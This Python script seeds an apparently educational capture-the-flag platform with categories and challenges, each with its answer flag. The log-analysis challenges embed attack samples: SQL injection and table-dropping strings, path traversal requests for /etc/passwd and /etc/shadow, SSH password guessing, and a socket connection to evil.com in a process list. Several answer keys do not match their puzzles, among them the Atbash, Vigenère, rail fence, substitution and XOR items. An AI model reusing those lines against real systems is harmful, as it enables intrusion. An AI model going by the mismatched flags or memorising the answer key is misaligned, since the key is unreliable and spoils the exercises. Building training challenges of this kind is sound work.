"""
Script to populate the database with sample challenges and categories
Run this after setting up the database to add initial data
"""

import os
import sys
# Add the parent directory (server) to the Python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app import app
from models import db, User, Category, Challenge
from config import Config

def create_sample_data():
    with app.app_context():
        # Create tables
        db.create_all()
        
        # Create admin user
        admin_user = User(
            username=Config.ADMIN_USERNAME,
            email=Config.ADMIN_EMAIL,
            is_admin=True,
            is_active=True
        )
        admin_user.set_password(Config.ADMIN_PASSWORD)
        
        # Check if admin already exists
        existing_admin = User.query.filter_by(username=Config.ADMIN_USERNAME).first()
        if not existing_admin:
            db.session.add(admin_user)
            print(f"Created admin user (username: {Config.ADMIN_USERNAME}, password: {Config.ADMIN_PASSWORD})")
        
        # Create categories
        categories_data = [
            {
                'name': 'Cryptography',
                'description': 'Encryption, decryption, and crypto analysis challenges',
                'icon': '🔐',
                'color': '#3B82F6'
            },
            {
                'name': 'Web Security',
                'description': 'XSS, SQL injection, and web vulnerabilities',
                'icon': '🌐',
                'color': '#10B981'
            },
            {
                'name': 'Forensics',
                'description': 'File analysis, steganography, and data recovery',
                'icon': '🔍',
                'color': '#8B5CF6'
            },
            {
                'name': 'Reverse Engineering',
                'description': 'Binary analysis and code understanding',
                'icon': '⚙️',
                'color': '#EF4444'
            },
            {
                'name': 'Network Security',
                'description': 'Packet analysis and network protocols',
                'icon': '🌐',
                'color': '#F59E0B'
            },
            {
                'name': 'Miscellaneous',
                'description': 'General security concepts and puzzles',
                'icon': '🎯',
                'color': '#6B7280'
            },
            {
                'name': 'Steganography',
                'description': 'Hidden messages in images and files',
                'icon': '🖼️',
                'color': '#EC4899'
            }
        ]
        
        for cat_data in categories_data:
            existing = Category.query.filter_by(name=cat_data['name']).first()
            if not existing:
                category = Category(**cat_data)
                db.session.add(category)
                print(f"Created category: {cat_data['name']}")
        
        # Get the admin user and categories for challenge creation
        admin = User.query.filter_by(username='admin').first()
        categories = {cat.name: cat.id for cat in Category.query.all()}
        
        # Create sample challenges
        challenges_data = [
            {
                'title': 'Caesar Cipher',
                'description': 'Decode this message: "khoor zruog"',
                'flag': 'hello world',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Base64 Decode',
                'description': 'Decode this base64 string: "ZmxhZ3t0aGlzX2lzX2Vhc3l9"',
                'flag': 'flag{this_is_easy}',
                'points': 75,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Simple XOR',
                'description': 'Decrypt this XOR encrypted message with key "key": "YlhaWg=="',
                'flag': 'flag{test}',
                'points': 100,
                'difficulty': 'Medium',
                'category_name': 'Cryptography'
            },
            {
                'title': 'ROT13 Cipher',
                'description': 'Decode this ROT13 message: "synt{vf_ebgngrq}"',
                'flag': 'flag{is_rotated}',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Hexadecimal Decode',
                'description': 'Decode this hex string: "666c61677b6865785f636f64657d"',
                'flag': 'flag{hex_code}',
                'points': 75,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Binary Decode',
                'description': 'Decode this binary string: "011001100110110001100001011001110111101101100010011010010110111001100001011100100111100101111101"',
                'flag': 'flag{binary}',
                'points': 75,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Vigenère Cipher',
                'description': 'Decrypt this Vigenère cipher with keyword "SECRET": "ZQX{UKGRV_VF_SBE}"',
                'flag': 'flag{vigenere_is_fun}',
                'points': 150,
                'difficulty': 'Medium',
                'category_name': 'Cryptography'
            },
            {
                'title': 'URL Decode',
                'description': 'Decode this URL encoded string: "flag%7Burl%5Fencoding%7D"',
                'flag': 'flag{url_encoding}',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Atbash Cipher',
                'description': 'Decode this Atbash cipher: "oztz{mlg_fh_zm_ivzw}"',
                'flag': 'flag{not_to_be_seen}',
                'points': 100,
                'difficulty': 'Medium',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Rail Fence Cipher',
                'description': 'Decode this rail fence cipher with 3 rails: "FRGA{L_GN_II_E_S_}"',
                'flag': 'flag{rail_fence_fun}',
                'points': 125,
                'difficulty': 'Medium',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Morse Code',
                'description': 'Decode this morse code: "..-. .-.. .- --. { -- --- .-. ... . / -.-. --- -.. . }"',
                'flag': 'flag{morse code}',
                'points': 75,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Reverse String',
                'description': 'Reverse this string to get the flag: "}edoc_esrever{galf"',
                'flag': 'flag{reverse_code}',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Logic Puzzle',
                'description': 'Solve this logic puzzle: If A=1, B=2, C=3, what is the sum of the letters in "FLAG"?',
                'flag': 'flag{26}',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Miscellaneous'
            },
            {
                'title': 'Hidden in Text',
                'description': 'Find the hidden message in this text: "Hello everyone. Every word matters here. Listen carefully now. Look at the beginning. Only first letters count."',
                'flag': 'flag{HELLO}',
                'points': 100,
                'difficulty': 'Easy',
                'category_name': 'Steganography'
            },
            {
                'title': 'Substitution Cipher',
                'description': 'Decode this substitution cipher: "GSV UOZT XZIVH R MVD ZM YVXIVW"',
                'flag': 'flag{the_flag_is_here}',
                'points': 125,
                'difficulty': 'Medium',
                'category_name': 'Cryptography'
            },
            {
                'title': 'Frequency Analysis',
                'description': 'Decode this message using frequency analysis: "QEB NRFZH YOLTK CLU GRJMP LSBO QEB IXWV ALD"',
                'flag': 'flag{frequency_analysis_works}',
                'points': 175,
                'difficulty': 'Hard',
                'category_name': 'Cryptography'
            },
            {
                'title': 'HTTP Headers',
                'description': 'Find the secret in the HTTP response headers below.',
                'flag': 'flag{secret_header_found}',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Web Security',
                'challenge_data': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 1234\nServer: nginx/1.18.0\nDate: Mon, 23 Sep 2024 10:30:00 GMT\nX-Powered-By: Express\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nStrict-Transport-Security: max-age=31536000\nX-Secret-Flag: secret_header_found\nCache-Control: no-cache\nConnection: keep-alive'
            },
            {
                'title': 'Log Analysis - Attack Type',
                'description': 'Analyze this web server log excerpt. What type of attack is being attempted? Submit the attack type as flag{attack_type}.',
                'flag': 'flag{sql_injection}',
                'points': 100,
                'difficulty': 'Medium',
                'category_name': 'Web Security',
                'challenge_data': '192.168.1.100 - - [23/Sep/2024:10:15:23 +0000] "GET /login.php?user=admin&pass=\' OR \'1\'=\'1 HTTP/1.1" 200 1567\n192.168.1.100 - - [23/Sep/2024:10:15:24 +0000] "GET /login.php?user=admin&pass=\'; DROP TABLE users; -- HTTP/1.1" 500 2341\n192.168.1.100 - - [23/Sep/2024:10:15:25 +0000] "GET /search.php?q=admin\' UNION SELECT password FROM users-- HTTP/1.1" 200 3421\n192.168.1.100 - - [23/Sep/2024:10:15:26 +0000] "GET /products.php?id=1\' AND 1=1-- HTTP/1.1" 200 2987\n192.168.1.100 - - [23/Sep/2024:10:15:27 +0000] "GET /products.php?id=1\' AND 1=2-- HTTP/1.1" 500 1456'
            },
            {
                'title': 'Malicious IP Detection',
                'description': 'This is a network traffic log. Find the malicious IP address that is performing suspicious activities. Submit as flag{malicious_ip}.',
                'flag': 'flag{10.0.0.42}',
                'points': 100,
                'difficulty': 'Medium',
                'category_name': 'Network Security',
                'challenge_data': '2024-09-23 10:30:15 192.168.1.10 -> 8.8.8.8:53 DNS Query: google.com\n2024-09-23 10:30:16 192.168.1.11 -> 1.1.1.1:53 DNS Query: facebook.com\n2024-09-23 10:30:17 10.0.0.42 -> 192.168.1.100:22 SSH: admin/admin123\n2024-09-23 10:30:18 10.0.0.42 -> 192.168.1.100:22 SSH: admin/password\n2024-09-23 10:30:19 10.0.0.42 -> 192.168.1.100:22 SSH: admin/123456\n2024-09-23 10:30:20 10.0.0.42 -> 192.168.1.100:80 HTTP GET /wp-admin/\n2024-09-23 10:30:21 192.168.1.12 -> 8.8.8.8:53 DNS Query: youtube.com\n2024-09-23 10:30:22 10.0.0.42 -> 192.168.1.100:80 HTTP GET /admin.php\n2024-09-23 10:30:23 10.0.0.42 -> 192.168.1.100:80 HTTP GET /login.php?cmd=whoami'
            },
            {
                'title': 'Firewall Rules',
                'description': 'Analyze this firewall log to find what type of traffic is being blocked. Submit the attack type as flag{traffic_type}.',
                'flag': 'flag{port_scan}',
                'points': 75,
                'difficulty': 'Easy',
                'category_name': 'Network Security',
                'challenge_data': 'Sep 23 10:45:01 firewall kernel: [BLOCKED] IN=eth0 OUT= SRC=203.0.113.5 DST=192.168.1.50 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=22 WINDOW=14600 SYN\nSep 23 10:45:02 firewall kernel: [BLOCKED] IN=eth0 OUT= SRC=203.0.113.5 DST=192.168.1.51 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12346 DF PROTO=TCP SPT=54322 DPT=22 WINDOW=14600 SYN\nSep 23 10:45:03 firewall kernel: [BLOCKED] IN=eth0 OUT= SRC=203.0.113.5 DST=192.168.1.52 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12347 DF PROTO=TCP SPT=54323 DPT=22 WINDOW=14600 SYN\nSep 23 10:45:04 firewall kernel: [BLOCKED] IN=eth0 OUT= SRC=203.0.113.5 DST=192.168.1.53 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12348 DF PROTO=TCP SPT=54324 DPT=22 WINDOW=14600 SYN\nSep 23 10:45:05 firewall kernel: [BLOCKED] IN=eth0 OUT= SRC=203.0.113.5 DST=192.168.1.54 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12349 DF PROTO=TCP SPT=54325 DPT=22 WINDOW=14600 SYN'
            },
            {
                'title': 'Email Header Analysis',
                'description': 'This email header contains a spoofed sender. Find the real sender IP address and submit as flag{real_ip}.',
                'flag': 'flag{192.168.100.50}',
                'points': 100,
                'difficulty': 'Medium',
                'category_name': 'Forensics',
                'challenge_data': 'Return-Path: <ceo@newfronttier.com>\nDelivered-To: victim@newfronttier.com\nReceived: from mail.newfronttier.com (mail.newfronttier.com [192.168.100.50])\n\tby mail.newfronttier.com (Postfix) with ESMTP id 12345ABC\n\tfor <victim@newfronttier.com>; Mon, 23 Sep 2024 10:30:00 +0000 (UTC)\nReceived: from bankofpeople.com (bankofpeople.com [10.0.0.100])\n\tby mail.newfronttier.com (Postfix) with ESMTP id 67890DEF\n\tfor <victim@newfronttier.com>; Mon, 23 Sep 2024 10:29:58 +0000 (UTC)\nFrom: "CEO Company" <ceo@newfronttier.com>\nTo: <victim@newfronttier.com>\nSubject: URGENT: Verify Your Account\nDate: Mon, 23 Sep 2024 10:30:00 +0000\nMessage-ID: <abc123@bankofpeople.com>\nX-Originating-IP: [192.168.100.50]'
            },
            {
                'title': 'Process List Analysis',
                'description': 'This process list shows a compromised system. There are multiple suspicious processes running. Identify the most obvious malicious process (the crypto miner) and submit as flag{process_name}.',
                'flag': 'flag{crypto_miner}',
                'points': 50,
                'difficulty': 'Easy',
                'category_name': 'Forensics',
                'challenge_data': 'UID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 09:00 ?        00:00:01 /sbin/init\nroot         2     0  0 09:00 ?        00:00:00 [kthreadd]\nuser      1234  1233  0 09:15 pts/0    00:00:00 bash\nuser      5678  1234  0 09:20 pts/0    00:05:23 /usr/bin/python3 crypto_miner\nuser      9012  5678  0 09:20 pts/0    00:03:45 /usr/bin/python3 -c import socket;s=socket.socket();s.connect((\'evil.com\',443))\nuser      3456  1234  0 09:25 pts/0    00:00:01 /usr/bin/nano document.txt\nuser      7890  1234  0 09:30 pts/0    00:00:00 ps aux'
            },
            {
                'title': 'DNS Query Log',
                'description': 'This query log shows evidence of a DNS attack. Analyze the timing patterns and identify the malicious domain that is attempting to poison legitimate domains. What is the attack type and what is the IP address of the attacker?',
                'flag': 'flag{dns_cache_poisoning}',
                'multi_flags': '{"flag": "dns_cache_poisoning", "flag2": "10.0.0.50"}',
                'points': 100,
                'difficulty': 'Medium',
                'category_name': 'Network Security',
                'challenge_data': 'Sep 23 10:30:01 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:02 DNS Query: amazon.com -> 1.1.1.1 (resolves to 54.239.28.85)\nSep 23 10:30:03 DNS Query: google.com -> 8.8.8.8 (resolves to 142.250.191.14)\nSep 23 10:30:04 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:05 DNS Query: paypal-security-verification.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:06 DNS Query: paypal.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:07 DNS Query: microsoft.com -> 1.1.1.1 (resolves to 20.70.246.20)\nSep 23 10:30:08 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:09 DNS Query: paypal-security-verification.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:10 DNS Query: paypal.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:11 DNS Query: facebook.com -> 8.8.8.8 (resolves to 31.13.69.35)\nSep 23 10:30:12 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:13 DNS Query: paypal-security-verification.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:14 DNS Query: paypal.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:15 DNS Query: youtube.com -> 1.1.1.1 (resolves to 142.250.191.14)\nSep 23 10:30:16 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:17 DNS Query: paypal-security-verification.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:18 DNS Query: paypal.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:19 DNS Query: github.com -> 8.8.8.8 (resolves to 140.82.112.4)\nSep 23 10:30:20 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:21 DNS Query: paypal-security-verification.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:22 DNS Query: paypal.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:23 DNS Query: stackoverflow.com -> 1.1.1.1 (resolves to 151.101.1.69)\nSep 23 10:30:24 DNS Query: paypal.com -> 8.8.8.8 (resolves to 66.211.169.3)\nSep 23 10:30:25 DNS Query: paypal-security-verification.com -> 10.0.0.50 (resolves to 10.0.0.50)\nSep 23 10:30:26 DNS Query: paypal.com -> 10.0.0.50 (resolves to 10.0.0.50)'
            },
            {
                'title': 'Web Application Attack',
                'description': 'This web server access log shows a specific type of attack. Identify the attack pattern and submit as flag{attack_pattern}.',
                'flag': 'flag{path_traversal}',
                'points': 150,
                'difficulty': 'Medium',
                'category_name': 'Web Security',
                'challenge_data': '192.168.1.100 - - [23/Sep/2024:10:30:01] "GET /../../../etc/passwd HTTP/1.1" 200 1234\n192.168.1.100 - - [23/Sep/2024:10:30:02] "GET /....//....//....//etc/passwd HTTP/1.1" 200 1234\n192.168.1.100 - - [23/Sep/2024:10:30:03] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 1234\n192.168.1.100 - - [23/Sep/2024:10:30:04] "GET /..%252f..%252f..%252fetc%252fpasswd HTTP/1.1" 200 1234\n192.168.1.100 - - [23/Sep/2024:10:30:05] "GET /../../../etc/shadow HTTP/1.1" 403 567'
            },
            {
                'title': 'C2 Beacon Detection',
                'description': 'This network traffic log shows C2 beaconing activity. Find the C2 server domain and submit as flag{c2_domain}.',
                'flag': 'flag{cdn.analytics-tracker.net}',
                'points': 150,
                'difficulty': 'Hard',
                'category_name': 'Network Security',
                'challenge_data': '2024-09-23 10:30:15 192.168.1.50 -> 8.8.8.8:53 DNS Query: google.com\n2024-09-23 10:30:20 192.168.1.50 -> 203.0.113.100:443 HTTPS GET /api/status\n2024-09-23 10:30:25 192.168.1.50 -> 8.8.8.8:53 DNS Query: facebook.com\n2024-09-23 10:30:30 192.168.1.50 -> 203.0.113.100:443 HTTPS GET /api/status\n2024-09-23 10:30:35 192.168.1.50 -> 1.1.1.1:53 DNS Query: youtube.com\n2024-09-23 10:30:40 192.168.1.50 -> 203.0.113.100:443 HTTPS GET /api/status\n2024-09-23 10:30:45 192.168.1.50 -> 8.8.8.8:53 DNS Query: cdn.analytics-tracker.net\n2024-09-23 10:30:46 192.168.1.50 -> 198.51.100.50:443 HTTPS GET /heartbeat\n2024-09-23 10:30:50 192.168.1.50 -> 8.8.8.8:53 DNS Query: amazon.com\n2024-09-23 10:30:55 192.168.1.50 -> 198.51.100.50:443 HTTPS GET /heartbeat\n2024-09-23 10:31:00 192.168.1.50 -> 1.1.1.1:53 DNS Query: microsoft.com\n2024-09-23 10:31:05 192.168.1.50 -> 198.51.100.50:443 HTTPS GET /heartbeat\n2024-09-23 10:31:10 192.168.1.50 -> 8.8.8.8:53 DNS Query: cdn.analytics-tracker.net\n2024-09-23 10:31:11 192.168.1.50 -> 198.51.100.50:443 HTTPS GET /heartbeat\n2024-09-23 10:31:15 192.168.1.50 -> 1.1.1.1:53 DNS Query: github.com\n2024-09-23 10:31:20 192.168.1.50 -> 198.51.100.50:443 HTTPS GET /heartbeat\n2024-09-23 10:31:25 192.168.1.50 -> 8.8.8.8:53 DNS Query: stackoverflow.com\n2024-09-23 10:31:30 192.168.1.50 -> 198.51.100.50:443 HTTPS GET /heartbeat'
            },
        ]
        
        for challenge_data in challenges_data:
            existing = Challenge.query.filter_by(title=challenge_data['title']).first()
            if not existing:
                category_name = challenge_data.pop('category_name')
                challenge_data['category_id'] = categories[category_name]
                challenge_data['author_id'] = admin.id
                
                challenge = Challenge(**challenge_data)
                db.session.add(challenge)
                print(f"Created challenge: {challenge_data['title']}")
        
        # Commit all changes
        db.session.commit()
        print("\nSample data created successfully!")
        print("\nYou can now:")
        print("1. Start the server: python app.py")
        print("2. Access the web interface at http://localhost:3000")
        print("3. Login with admin/admin123! to access admin features")

if __name__ == '__main__':
    create_sample_data()
